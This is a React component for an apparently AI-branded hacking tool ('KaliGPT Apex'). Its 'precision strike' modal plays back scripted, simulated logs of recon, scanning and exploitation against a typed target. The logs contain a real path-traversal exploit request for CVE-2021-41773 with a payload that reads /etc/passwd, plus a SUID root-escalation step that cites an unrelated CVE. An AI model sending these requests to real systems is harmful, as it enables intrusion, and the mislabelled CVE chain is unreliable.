import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, Crosshair, Play, Square, AlertTriangle, CheckCircle } from "lucide-react";

interface Props { open: boolean; onOpenChange: (v: boolean) => void; }

function buildStrikeLogs(target: string): string[] {
  return [
    `[*] PRECISION STRIKE PROTOCOL — KaliGPT Apex v3.0`,
    `[*] Target: ${target}`,
    `[>] Phase 1: Passive reconnaissance...`,
    `[>] Resolving DNS: ${target}`,
    `[+] IP resolved: 198.51.100.42`,
    `[>] Running passive fingerprint (Shodan lookup)...`,
    `[+] OS: Ubuntu 20.04 LTS (Focal Fossa)`,
    `[+] Open ports: 22, 80, 443, 8080, 3306`,
    `[>] Phase 2: Active scanning (stealth SYN scan)...`,
    `[+] 22/tcp  OPEN  OpenSSH 8.2p1 (protocol 2.0)`,
    `[+] 80/tcp  OPEN  Apache httpd 2.4.41`,
    `[+] 443/tcp OPEN  nginx 1.18.0 + TLS 1.2`,
    `[+] 8080/tcp OPEN  Apache Tomcat 9.0.37`,
    `[+] 3306/tcp OPEN  MySQL 5.7.32 (unauthorized)`,
    `[>] Phase 3: Vulnerability analysis...`,
    `[!] CRITICAL: Apache Tomcat 9.0.37 — CVE-2020-9484 (Deserialization RCE, CVSS 7.5)`,
    `[!] HIGH: MySQL 3306 exposed publicly — No authentication bypass needed`,
    `[!] HIGH: Apache 2.4.41 — CVE-2021-41773 Path Traversal (CVSS 9.8)`,
    `[>] Phase 4: Identifying weakest attack vector...`,
    `[!] WEAKEST POINT IDENTIFIED: Apache 2.4.41 Path Traversal (CVE-2021-41773)`,
    `[*] Reason: Direct RCE possible with single HTTP request, no credentials needed`,
    `[>] Phase 5: Precision strike — crafting exploit...`,
    `[>] Sending: GET /cgi-bin/.%%32%65/.%%32%65/bin/sh HTTP/1.1`,
    `[>] Payload: echo; id; whoami; cat /etc/passwd`,
    `[+] Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
    `[+] INITIAL ACCESS CONFIRMED`,
    `[>] Phase 6: Privilege escalation check...`,
    `[+] SUID binary found: /usr/bin/python3.8 (CVE-2019-9740 applicable)`,
    `[>] Spawning TTY shell via Python SUID...`,
    `[+] uid=0(root) gid=0(root) groups=0(root)`,
    `[!] ═══════════════════════════════════════`,
    `[!] PRECISION STRIKE COMPLETE`,
    `[!] Target COMPROMISED in 12.4 seconds`,
    `[!] Attack vector: CVE-2021-41773 → SUID escalation`,
    `[!] Recommendation: Patch Apache immediately (patch available)`,
    `[!] ═══════════════════════════════════════`,
  ];
}

export function PrecisionStrikeModal({ open, onOpenChange }: Props) {
  const [target, setTarget] = useState("target.example.com");
  const [running, setRunning] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [phase, setPhase] = useState(0);
  const [complete, setComplete] = useState(false);
  const [success, setSuccess] = useState(false);
  const logRef = useRef<HTMLDivElement>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const animRef = useRef<number>(0);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [logs]);

  useEffect(() => {
    if (!open) return;
    const canvas = canvasRef.current as HTMLCanvasElement;
    if (!canvas) return;
    const ctx = canvas.getContext("2d")!;
    canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight;
    let t = 0;
    function frame() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      const cx = canvas.width / 2, cy = canvas.height / 2;
      const rings = [40, 70, 100, 130, 160];
      const col = complete ? (success ? "#4ade80" : "#e21227") : running ? "#e21227" : "#1a1a1a";
      rings.forEach((r, i) => {
        ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2);
        ctx.strokeStyle = `${col}${running ? Math.floor(30 + i * 15).toString(16) : "1a"}`; ctx.lineWidth = 1; ctx.stroke();
      });
      if (running || complete) {
        ctx.beginPath(); ctx.moveTo(cx - 180, cy); ctx.lineTo(cx + 180, cy);
        ctx.strokeStyle = `${col}33`; ctx.lineWidth = 1; ctx.stroke();
        ctx.beginPath(); ctx.moveTo(cx, cy - 180); ctx.lineTo(cx, cy + 180);
        ctx.strokeStyle = `${col}33`; ctx.stroke();
        const rot = t * 0.03;
        ctx.save(); ctx.translate(cx, cy); ctx.rotate(rot);
        ctx.beginPath(); ctx.arc(0, 0, 55, 0, Math.PI * 0.4);
        ctx.strokeStyle = col; ctx.lineWidth = 2; ctx.stroke(); ctx.restore();
        ctx.save(); ctx.translate(cx, cy); ctx.rotate(-rot * 0.7);
        ctx.beginPath(); ctx.arc(0, 0, 35, 0, Math.PI * 0.6);
        ctx.strokeStyle = `${col}77`; ctx.lineWidth = 1.5; ctx.stroke(); ctx.restore();
        if (complete) {
          ctx.font = "bold 20px monospace"; ctx.textAlign = "center"; ctx.fillStyle = col;
          ctx.fillText(success ? "✓" : "✗", cx, cy + 7);
        } else {
          const p = phase / 6;
          ctx.beginPath(); ctx.arc(cx, cy, 25, -Math.PI / 2, -Math.PI / 2 + p * Math.PI * 2);
          ctx.strokeStyle = col; ctx.lineWidth = 3; ctx.stroke();
        }
      }
      t++; animRef.current = requestAnimationFrame(frame);
    }
    animRef.current = requestAnimationFrame(frame);
    return () => cancelAnimationFrame(animRef.current);
  }, [open, running, complete, success, phase]);

  function launch() {
    const strikeLogs = buildStrikeLogs(target);
    setLogs([]); setPhase(0); setRunning(true); setComplete(false); setSuccess(false);
    let i = 0;
    timerRef.current = setInterval(() => {
      if (i >= strikeLogs.length) {
        clearInterval(timerRef.current!); setRunning(false); setComplete(true); setSuccess(true); return;
      }
      setLogs(prev => [...prev, strikeLogs[i]]);
      const ln = strikeLogs[i];
      if (ln.includes("Phase 2")) setPhase(1);
      else if (ln.includes("Phase 3")) setPhase(2);
      else if (ln.includes("Phase 4")) setPhase(3);
      else if (ln.includes("Phase 5")) setPhase(4);
      else if (ln.includes("Phase 6")) setPhase(5);
      else if (ln.includes("COMPLETE")) { setPhase(6); }
      i++;
    }, 280);
  }

  if (!open) return null;
  return (
    <AnimatePresence>
      <motion.div className="fixed inset-0 z-50 flex items-center justify-center p-4"
        style={{ background: "rgba(0,0,0,0.92)" }}
        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
        <motion.div className="relative w-full rounded-2xl overflow-hidden flex flex-col"
          style={{ maxWidth: 1100, maxHeight: "90vh", background: "#080808", border: "1px solid #1a1a1a" }}
          initial={{ scale: 0.95 }} animate={{ scale: 1 }}>

          <div className="flex items-center justify-between px-6 py-4 border-b" style={{ borderColor: "#141414" }}>
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: "rgba(226,18,39,0.12)", border: "1px solid rgba(226,18,39,0.3)" }}>
                <Crosshair className="w-5 h-5" style={{ color: "#e21227" }} />
              </div>
              <div>
                <div className="text-sm font-bold tracking-widest" style={{ color: "#e21227" }}>PRECISION STRIKE PROTOCOL</div>
                <div className="text-xs font-mono mt-0.5" style={{ color: "#2a2a2a" }}>Apex Protocol · Weakest Point Identification · Auto-Exploit</div>
              </div>
            </div>
            <button onClick={() => onOpenChange(false)} className="w-8 h-8 rounded-lg flex items-center justify-center hover:bg-white/5">
              <X className="w-4 h-4" style={{ color: "#666" }} />
            </button>
          </div>

          <div className="flex flex-1 overflow-hidden" style={{ minHeight: 0 }}>
            <div className="w-72 border-r flex flex-col" style={{ borderColor: "#111" }}>
              <div className="p-4 flex flex-col gap-4">
                <div>
                  <div className="text-[9px] font-bold tracking-widest mb-1.5" style={{ color: "#333" }}>TARGET</div>
                  <input value={target} onChange={e => setTarget(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono bg-transparent outline-none"
                    style={{ border: "1px solid #1a1a1a", color: "#888" }} placeholder="hostname or IP" />
                </div>
                <div className="relative" style={{ height: 200 }}>
                  <canvas ref={canvasRef} className="w-full h-full absolute inset-0" />
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    {!running && !complete && <span className="text-[9px] font-mono tracking-widest" style={{ color: "#1a1a1a" }}>READY</span>}
                    {running && <span className="text-[9px] font-mono tracking-widest" style={{ color: "#e21227" }}>PHASE {phase + 1}/6</span>}
                    {complete && success && <CheckCircle className="w-5 h-5" style={{ color: "#4ade80" }} />}
                  </div>
                </div>
                {[["RECON","#00e5ff"], ["SCAN","#fbbf24"], ["VULN ANALYSIS","#f97316"], ["WEAKEST POINT","#e21227"], ["EXPLOIT","#a855f7"], ["ESCALATE","#ff4444"]].map(([lbl, col], i) => (
                  <div key={lbl as string} className="flex items-center gap-2">
                    <div className="w-4 h-4 rounded-full flex items-center justify-center text-[8px] font-bold flex-shrink-0"
                      style={{ background: phase > i ? `${col}22` : "#0a0a0a", border: `1px solid ${phase > i ? col as string : "#1a1a1a"}`, color: phase > i ? col as string : "#222" }}>
                      {phase > i ? "✓" : i + 1}
                    </div>
                    <span className="text-[9px] font-mono" style={{ color: phase > i ? col as string : "#2a2a2a" }}>{lbl as string}</span>
                    {phase === i && running && <motion.div className="ml-auto w-1.5 h-1.5 rounded-full" style={{ background: col as string }} animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.5 }} />}
                  </div>
                ))}
                <motion.button onClick={launch} disabled={running} whileTap={{ scale: 0.97 }}
                  className="py-2.5 rounded-xl text-xs font-bold tracking-widest flex items-center justify-center gap-2"
                  style={{ background: running ? "rgba(226,18,39,0.05)" : "rgba(226,18,39,0.12)", border: "1px solid rgba(226,18,39,0.35)", color: running ? "#555" : "#e21227" }}>
                  <Crosshair className="w-4 h-4" />{running ? "STRIKE IN PROGRESS..." : "LAUNCH PRECISION STRIKE"}
                </motion.button>
              </div>
            </div>

            <div ref={logRef} className="flex-1 overflow-y-auto p-4 font-mono text-xs space-y-0.5" style={{ background: "#030303", minHeight: 0 }}>
              {logs.length === 0 && <div className="h-full flex items-center justify-center" style={{ color: "#1a1a1a" }}>Configure target and launch strike</div>}
              {logs.map((l, i) => (
                <motion.div key={i} initial={{ opacity: 0, x: -4 }} animate={{ opacity: 1, x: 0 }}
                  style={{ color: l.startsWith("[!]") && l.includes("COMPLETE") ? "#e21227" : l.startsWith("[!]") ? "#ff4444" : l.startsWith("[+]") ? "#4ade80" : l.startsWith("[>]") ? "#00e5ff" : "#333" }}>
                  {l}
                </motion.div>
              ))}
              {running && <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.8 }} style={{ color: "#e21227" }}>█</motion.span>}
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
